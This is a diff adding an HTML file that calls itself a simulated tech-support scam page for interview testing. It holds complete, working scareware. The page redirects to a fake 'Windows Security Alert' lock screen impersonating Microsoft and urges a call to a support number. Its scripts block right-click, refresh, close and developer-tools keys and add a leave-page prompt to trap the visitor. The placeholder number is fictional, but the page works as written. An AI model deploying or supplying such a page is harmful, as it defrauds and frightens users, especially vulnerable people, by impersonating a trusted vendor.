@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<!--
+  Simulated tech-support scam page for interview testing purposes only.
+  This is a self-contained demo, not a real attack. The "support number"
+  below is a fictional placeholder (555 exchange).
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Loading...</title>
+</head>
+<body>
+<script>
+  const lockScreenHtml = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8" />
+      <title>Windows Security Alert</title>
+      <style>
+        body {
+          margin: 0;
+          font-family: Arial, sans-serif;
+          background: #002bff;
+          color: white;
+          height: 100vh;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+        }
+        .box {
+          max-width: 640px;
+          text-align: center;
+          padding: 40px;
+        }
+        h1 { font-size: 28px; }
+        .phone {
+          font-size: 32px;
+          font-weight: bold;
+          color: #ffdd00;
+          margin: 24px 0;
+        }
+        .warning { font-size: 60px; }
+      </style>
+    </head>
+    <body>
+      <div class="box">
+        <div class="warning">&#9888;</div>
+        <h1>Your computer has been locked</h1>
+        <p>
+          Unusual activity has been detected on this device. Your IP
+          address and personal files may be at risk. Do not restart
+          or shut down your computer.
+        </p>
+        <p>Call Microsoft Support immediately:</p>
+        <div class="phone">1-800-555-0199</div>
+        <p>Error Code: 0x800704cf</p>
+      </div>
+      <script>
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+          const blocked = ['F5', 'F11', 'F12', 'Escape'];
+          if (blocked.includes(e.key) || (e.ctrlKey && ['r', 'w', 'l'].includes(e.key.toLowerCase()))) {
+            e.preventDefault();
+          }
+        });
+        window.addEventListener('beforeunload', (e) => {
+          e.preventDefault();
+          e.returnValue = '';
+        });
+      <\/script>
+    </body>
+    </html>
+  `;
+
+  const blob = new Blob([lockScreenHtml], { type: 'text/html' });
+  const blobUrl = URL.createObjectURL(blob);
+  window.location.href = blobUrl;
+</script>
+</body>
+</html>
